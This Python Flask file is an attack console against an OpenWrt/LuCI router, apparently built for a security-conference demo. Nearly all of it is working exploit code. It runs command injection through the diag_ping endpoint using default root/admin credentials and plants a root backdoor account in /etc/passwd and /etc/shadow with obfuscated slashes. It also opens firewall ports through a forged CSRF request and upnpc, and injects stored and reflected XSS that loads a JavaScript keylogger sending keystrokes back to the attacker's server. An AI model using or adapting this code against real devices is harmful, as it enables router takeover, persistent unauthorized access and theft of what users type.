#!/usr/bin/python
from flask import Flask, redirect, url_for
from subprocess import call
import os
from utilities import *
from urllib import quote
import requests
app = Flask(__name__)
app.debug=True

upnpc_forward='upnpc -m 172.30.254.2 -a 172.30.254.1 80 80 TCP'
keylogger_file='keylogger.php'
start_ivwrt_cmd='sh iv-wrt.sh'
passwd_implant='echo ruser:x:0:0:rservice_default:`echo $PWD |cut -c1`tmp:`echo $PWD |cut -c1`bin`echo $PWD |cut -c1`ash >> `echo $PWD |cut -c1`etc`echo $PWD |cut -c1`passwd'
shadow_implant='echo ruser:\'$\'1\'$\'4Q5Z0BuW\'$\'9UI5yWhHR3.NWxjuDR2Cs`echo $PWD|cut -c1`:16528:0:99999:7::: >> `echo $PWD|cut -c1`etc`echo $PWD|cut -c1`shadow'
xss_alert_script='alert(1)'
xss_alert_injection='script src=//172&#46;30&#46;254&#46;2/s>'
xss_keylogger_injection='<script src=//172&#46;30&#46;254&#46;2/t>'
wan_ip='10.254.254.1'

@app.route('/')
def root():
    return \
    '<!--'+\
    check("requests")+\
    check("bs4")+\
    '-->'+\
    '<br><a href=/call/'+quote(start_ivwrt_cmd)+'>Start Iv-Wrt</a></>\
    <br><a href=http://'+ip+'/>LAN side</a></>\
    <br><a href=http://'+wan_ip+'/>WAN Side</a></>\
    <br><a href=/call/'+quote(upnpc_forward)+'>Poke a hole via upnp</a></>\
    <br>'+\
    mk_csrf_link('80', 'Clck to get CSRF\'d')+\
    '</>\
    <br><a href=http://'+ip+'/cgi-bin/luci/admin/network/diagnostics/>Authentication Bypass</a></>\
    <br><a href=/implant_backdoor>Implant a Backdoor</a></>\
    <br><a href=/reflected_xss>Reflected XSS attack (doesn\'t work in chrome)</a></>\
    <br><a href=/cmd_inject/ls>Command Injection: ls</a></>\
    <br></>\
    <br>The XSS attack string to call a remote payload should look like this: <xmp><'+xss_alert_injection+'></script>.</xmp> That points to <a href=/s>/s</a> which is the simple alert(1) script. For the keylogger, you should point to <a href=/t>/t</a>, so it would look like this: <xmp>'+xss_keylogger_injection+'</xmp></>\
    <br><xmp>To check for an IGD use "upnpc -m <iface> -s" and to open port 80 to the WAN use "upnpc -m <iface> -a <ip> <port> <external_port> (TCP|UDP)." For our purposes that\'ll look like: '+upnpc_forward+'</xmp></br>\
    <br>/etc/passwd command injection backdoor implant:</br><br>;'+passwd_implant+'</br>\
    <br>/etc/shadow command injection backdoor implant:</br><br>;'+shadow_implant+'</br>\
'

@app.route('/call/<command>/')
def no_opts_call(command):
    return call_optless_command(command)

@app.route('/call/<command>/<flags>/')
def opts_call(command, flags):
    return call_command(command, flags)

def auth_get(url):
    payload = {
        'luci_username': uname,
        'luci_password': pword,
        }
    session = requests.session()
    r = session.post(url, data = payload)
    return r.text

def get(url):
    session = requests.session()
    r = session.get(url)
    return r.text

#
#Command injection stuff
#
uname = 'root'
pword = 'admin'
ip = '172.30.254.1'
@app.route('/cmd_inject/<command>')
def cmd_inject(command):
    return auth_get('http://'+ip+'/cgi-bin/luci/admin/network/diag_ping/;'+command)
    

@app.route('/unauth_cmd_inject/<command>/')
def unauth_cmd_inject(command):
    return get('http://'+ip+'/cgi-bin/luci/admin/network/diag_ping/;'+command)

@app.route('/implant_backdoor')
def implant_backdoor():
    cmd_inject(passwd_implant)
    cmd_inject(shadow_implant)
    no_opts_call('./backdoor '+ip)
    return ''
#
#XSS Stuff
#

@app.route('/fread/<file>')
def fread(file):
    return read_from_file(file)

#this is how our keylogger will get data back to the server, it'll write to ~\log.txt
@app.route('/fwrite/<data>')
def fwrite(data):
    return write_to_file(data)

#this is the code for the actual key logger--it logs keys and sends them back to the server.
@app.route('/t')
def keylogger():
    return fread(keylogger_file)
#    return '\
#            function httpGet(theUrl){\
#                var xmlHttp = new XMLHttpRequest();\
#                xmlHttp.open( \"GET\", theUrl, false );\
#                xmlHttp.send( null );\
#                return xmlHttp.responseText;\
#            }\
#            \
#            var keys=\'\';\
#            document.onkeypress = function(e) {\
#                get = window.event?event:e;\
#                key = get.keyCode?get.keyCode:get.charCode;\
#                key = String.fromCharCode(key);\
#                keys+=key;\
#                httpGet(\'http://127.0.0.1/fwrite/\'+key);\
#            }\
#            '

#this is a simple javascript alert payload....boring right?
@app.route('/s')
def do():
    return 'alert(1)'

#this is the final attack string for the stored cross-site scripting attack...it's just here for your convenience
@app.route('/stored_xss_attack')
def sxa():
    return '<xmp><script src=//172&#46;30&#46;254&#46;2/s></script></xmp>'

#
#CSRF Stuff
#
def mk_csrf_url(port):
    return 'http://172.30.254.1/cgi-bin/luci/;stok=a/admin/network/firewall/rules/?cbi.cbe.firewall.cfg0892bd.enabled=1&_newopen.extport='+port+'&_newfwd.dest=wan&cbi.cbe.firewall.cfg0a92bd.enabled=1&cbi.submit=1&cbi.sts.firewall.redirect=&cbid.firewall.cfg0292bd.enabled=1&cbi.cbe.firewall.cfg0492bd.enabled=1&cbid.firewall.cfg0a92bd.enabled=1&_newsnat.dport=&_newsnat.dip=1&cbid.firewall.cfg0692bd.enabled=1&_newsnat.dest=wan&cbid.firewall.cfg0892bd.enabled=1&_newsnat.src=lan&_newfwd.src=lan&cbi.cbe.firewall.cfg0692bd.enabled=1&cbi.cbe.firewall.cfg0292bd.enabled=1&_newsnat.name=&_newopen.submit=Add&_newfwd.name=&_newopen.proto=tcp&_newopen.name=hello_bsides&cbid.firewall.cfg0492bd.enabled=1&cbi.sts.firewall.rule=&cbi.apply=Save & Apply'

def mk_csrf_link(port, linktext):
   return '<a href=/csrf/open/'+port+'>'+linktext+'</a>'

#open whicherver port is specified in the url
@app.route('/csrf/open/<port>')
def csrf_open(port):
    return redirect(mk_csrf_url(port))

#
#Command Injection Stuff
#

#@app.route('/command_injection_ls')
#def #cmd_inject():
#    return '<a href=http://172.30.254.1/cgi-bin/luci/admin/network/diag_ping/;ls>;ls</>'

#
#Reflected Cross-Site Scripting Stuff
#

@app.route('/reflected_xss')
def xss():
    return '<a href=http://172.30.254.1/cgi-bin/luci/;stok=whatever/admin/system/packages?query=\'&lt;script&gt;alert(1)&lt;/script&gt;>Relfected_XSS</>'

@app.route('/check/<module>')
def check(module):
    return check_module(module)

if __name__ == '__main__':
    #app.run(port=5000)
    app.run(port=80, host='0.0.0.0',threaded=True) #to allow remote hosts

